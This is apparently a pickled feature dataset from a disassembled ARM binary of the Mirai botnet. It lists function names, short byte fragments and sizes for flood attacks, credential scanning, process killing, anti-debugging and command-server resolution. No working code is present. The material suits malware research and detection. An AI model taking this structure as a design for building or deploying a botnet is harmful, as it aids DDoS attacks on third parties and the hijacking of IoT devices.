(lp0
(S'.init_proc'
p1
S'0ddfe200eb2aebaf1b'
p2
L24L
tp3
a(S'ioctl'
p4
S'00'
p5
L12L
tp6
a(S'recv'
p7
S'00'
p8
L12L
tp9
a(S'connect'
p10
S'00'
p11
L12L
tp12
a(S'sigemptyset'
p13
S'00'
p14
L12L
tp15
a(S'memmove'
p16
S'00'
p17
L12L
tp18
a(S'getpid'
p19
S'00'
p20
L12L
tp21
a(S'prctl'
p22
S'00'
p23
L12L
tp24
a(S'memcpy'
p25
S'00'
p26
L12L
tp27
a(S'readlink'
p28
S'00'
p29
L12L
tp30
a(S'malloc'
p31
S'00'
p32
L12L
tp33
a(S'sleep'
p34
S'00'
p35
L12L
tp36
a(S'recvfrom'
p37
S'00'
p38
L12L
tp39
a(S'socket'
p40
S'00'
p41
L12L
tp42
a(S'select'
p43
S'00'
p44
L12L
tp45
a(S'readdir'
p46
S'00'
p47
L12L
tp48
a(S'sigaddset'
p49
S'00'
p50
L12L
tp51
a(S'send'
p52
S'00'
p53
L12L
tp54
a(S'abort'
p55
S'00'
p56
L12L
tp57
a(S'accept'
p58
S'00'
p59
L12L
tp60
a(S'calloc'
p61
S'00'
p62
L12L
tp63
a(S'write'
p64
S'00'
p65
L12L
tp66
a(S'kill'
p67
S'00'
p68
L12L
tp69
a(S'bind'
p70
S'00'
p71
L12L
tp72
a(S'inet_addr'
p73
S'00'
p74
L12L
tp75
a(S'chdir'
p76
S'00'
p77
L12L
tp78
a(S'setsockopt'
p79
S'00'
p80
L12L
tp81
a(S'signal'
p82
S'00'
p83
L12L
tp84
a(S'read'
p85
S'00'
p86
L12L
tp87
a(S'unlink'
p88
S'00'
p89
L12L
tp90
a(S'sendto'
p91
S'00'
p92
L12L
tp93
a(S'realloc'
p94
S'00'
p95
L12L
tp96
a(S'listen'
p97
S'00'
p98
L12L
tp99
a(S'fork'
p100
S'00'
p101
L12L
tp102
a(S'__uClibc_main'
p103
S'00'
p104
L12L
tp105
a(S'memset'
p106
S'00'
p107
L12L
tp108
a(S'getppid'
p109
S'00'
p110
L12L
tp111
a(S'time'
p112
S'00'
p113
L12L
tp114
a(S'opendir'
p115
S'00'
p116
L12L
tp117
a(S'getsockopt'
p118
S'00'
p119
L12L
tp120
a(S'__errno_location'
p121
S'00'
p122
L12L
tp123
a(S'exit'
p124
S'00'
p125
L12L
tp126
a(S'atoi'
p127
S'00'
p128
L12L
tp129
a(S'open'
p130
S'00'
p131
L12L
tp132
a(S'clock'
p133
S'00'
p134
L12L
tp135
a(S'setsid'
p136
S'00'
p137
L12L
tp138
a(S'closedir'
p139
S'00'
p140
L12L
tp141
a(S'fcntl'
p142
S'00'
p143
L12L
tp144
a(S'close'
p145
S'00'
p146
L12L
tp147
a(S'raise'
p148
S'00'
p149
L12L
tp150
a(S'free'
p151
S'00'
p152
L12L
tp153
a(S'sigprocmask'
p154
S'00'
p155
L12L
tp156
a(S'getsockname'
p157
S'00'
p158
L12L
tp159
a(S'__do_global_dtors_aux'
p160
S'30e900d50053e3800094e520e3000a833002a0e520e3'
p161
L104L
tp162
a(S'call___do_global_dtors_aux'
p163
S'042d'
p164
L8L
tp165
a(S'frame_dummy'
p166
S'3c9fe500042de51011'
p167
L68L
tp168
a(S'call_frame_dummy'
p169
S'042d'
p170
L8L
tp171
a(S'_start'
p172
S'00a0e420e500e5c00c9fe5'
p173
L44L
tp174
a(S'attack_app_http'
p175
S''
p176
L7608L
tp177
a(S'attack_get_opt_str'
p178
S'ff000050e3402de240a0dad10253e1c00400090004dc0253e1c0e0e2000ca01aa0e804a0'
p179
L100L
tp180
a(S'attack_get_opt_ip'
p181
S'10e9ff0203e130eb00010010e804a0'
p182
L48L
tp183
a(S'attack_get_opt_int'
p184
S'10e9ff0203e130eb000aa00a40bdea'
p185
L52L
tp186
a(S'attack_start'
p187
g176
L232L
tp188
a(S'attack_parse'
p189
g176
L596L
tp190
a(S'attack_kill_all'
p191
S'702de560a0e200ea54e1000a0009a00af6eb608405'
p192
L72L
tp193
a(S'add_attack'
p194
g176
L92L
tp195
a(S'attack_init'
p196
S'042de310eb00e5'
p197
L132L
tp198
a(S'attack_gre_eth'
p199
g176
L1912L
tp200
a(S'attack_gre_ip'
p201
g176
L1816L
tp202
a(S'attack_tcp_stomp'
p203
g176
L2168L
tp204
a(S'attack_tcp_ack'
p205
g176
L1904L
tp206
a(S'attack_tcp_syn'
p207
g176
L1856L
tp208
a(S'attack_udp_plain'
p209
g176
L708L
tp210
a(S'attack_udp_generic'
p211
g176
L1404L
tp212
a(S'attack_udp_vse'
p213
g176
L1216L
tp214
a(S'attack_udp_dns'
p215
g176
L1960L
tp216
a(S'checksum_generic'
p217
S'0151e3c000a0e520e51002e100038c0280'
p218
L92L
tp219
a(S'checksum_tcpudp'
p220
S'02a0e3402de1688000080000a0e520e5c08300e0e010ca5ce3300504a0e128e528e030e118e030e0280a38e100e1'
p221
L176L
tp222
a(S'mem_exists'
p223
S'0153e1402dd340a0e100ca51e2003a20e730e500018c00a00a100180'
p224
L92L
tp225
a(S'killer_kill'
p226
S'089fe500e3e7'
p227
L16L
tp228
a(S'killer_kill_by_port'
p229
g176
L1380L
tp230
a(S'killer_init'
p231
g176
L1696L
tp232
a(S'anti_gdb_entry'
p233
S'089fe530e5'
p234
L16L
tp235
a(S'teardown_connection'
p236
S'10e90094e500d0ff00e001a0e540bd'
p237
L40L
tp238
a(S'ensure_single_instance'
p239
g176
L356L
tp240
a(S'main'
p241
g176
L2216L
tp242
a(S'resolve_cnc_addr'
p243
S'702de308eb10e308eb00eb50a0e308eb0058609fe580140000d5600beb3104869600eb00eb10e308eb20e530e534e114e100e530e540bd'
p244
L140L
tp245
a(S'rand_next'
p246
S'702de5609fe530e5e0e5409fe53522009ee5c004e010e52070'
p247
L72L
tp248
a(S'rand_str'
p249
S'30e900e1800a000154e34044e2000a'
p250
L96L
tp251
a(S'rand_alphastr'
p252
S'30e901e150a0e500e3e1eb0000da00009aa0e330e210e010018c045ce310e404e1'
p253
L144L
tp254
a(S'rand_init'
p255
S'30e99ae500eb40a0eb509fe5402400e5e1eb30e510e030e5'
p256
L76L
tp257
a(S'resolv_skip_name'
p258
S'01a0e5e0e5e0e330e50003a00a009a8c0343e200e50001a0e1'
p259
L120L
tp260
a(S'resolv_entries_free'
p261
S'10e91094e50089ff04a0e8'
p262
L36L
tp263
a(S'resolv_domain_to_hostname'
p264
S'30e901a0e109ebe0e100e2c000d50053e30001c4200504a00350850140e240a0e310ef'
p265
L116L
tp266
a(S'resolv_lookup'
p267
g176
L1096L
tp268
a(S'consume_any_prompt'
p269
S'1890e520e2001530e500000b000c002353e3000a000a000280000ad3003a5313000a53e3'
p270
L116L
tp271
a(S'can_consume'
p272
S'1890e500e020e10083'
p273
L32L
tp274
a(S'scanner_kill'
p275
S'089fe500e3'
p276
L16L
tp277
a(S'deobf'
p278
S'702de150a0eb00ae'
p279
L96L
tp280
a(S'add_auth_entry'
p281
g176
L284L
tp282
a(S'setup_connection'
p283
S'702de100e260a0e360'
p284
L208L
tp285
a(S'recv_strip_null'
p286
S'10e903'
p287
L56L
tp288
a(S'scanner_init'
p289
g176
L6012L
tp290
a(S'table_retrieve_val'
p291
S'209fe501e000053015021130'
p292
L40L
tp293
a(S'toggle_obf'
p294
S'80e1402de330e10ae030e220e530e504e134e138e2500322ff02'
p295
L176L
tp296
a(S'table_lock_val'
p297
S'ff00cf'
p298
L8L
tp299
a(S'table_unlock_val'
p300
S'ff00cd'
p301
L8L
tp302
a(S'add_entry'
p303
g176
L76L
tp304
a(S'table_init'
p305
S'042de313e3'
p306
L808L
tp307
a(S'util_strlen'
p308
S'00a0e5000e'
p309
L40L
tp310
a(S'util_strncmp'
p311
g176
L96L
tp312
a(S'util_strcmp'
p313
S'702de150a0eb60a0e1'
p314
L88L
tp315
a(S'util_memcpy'
p316
S'0052e3'
p317
L36L
tp318
a(S'util_strcpy'
p319
S'702de100e1'
p320
L48L
tp321
a(S'util_zero'
p322
S'0051e3'
p323
L36L
tp324
a(S'util_itoa'
p325
g176
L220L
tp326
a(S'util_memsearch'
p327
S'0153e1402de150a0e100da00e380fb'
p328
L104L
tp329
a(S'util_stristr'
p330
g176
L120L
tp331
a(S'util_atoi'
p332
g176
L300L
tp333
a(S'util_fdgets'
p334
g176
L96L
tp335
a(S'util_local_addr'
p336
g176
L156L
tp337
a(S'__udivsi3'
p338
S'0151e2'
p339
L248L
tp340
a(S'__aeabi_uidivmod'
p341
S'03e90640bde0100e'
p342
L24L
tp343
a(S'__umodsi3'
p344
S'0151e2003a0000a081'
p345
L204L
tp346
a(S'__modsi3'
p347
S'0051e3000a1000b00060420151e20000a081009a51e30001a032'
p348
L228L
tp349
a(S'__do_global_ctors_aux'
p350
S'289fe520e50010e910a0e120fa'
p351
L48L
tp352
a(S'call___do_global_ctors_aux'
p353
S'042d'
p354
L8L
tp355
a(S'.term_proc'
p356
S'0ddfe2d6'
p357
L20L
tp358
a.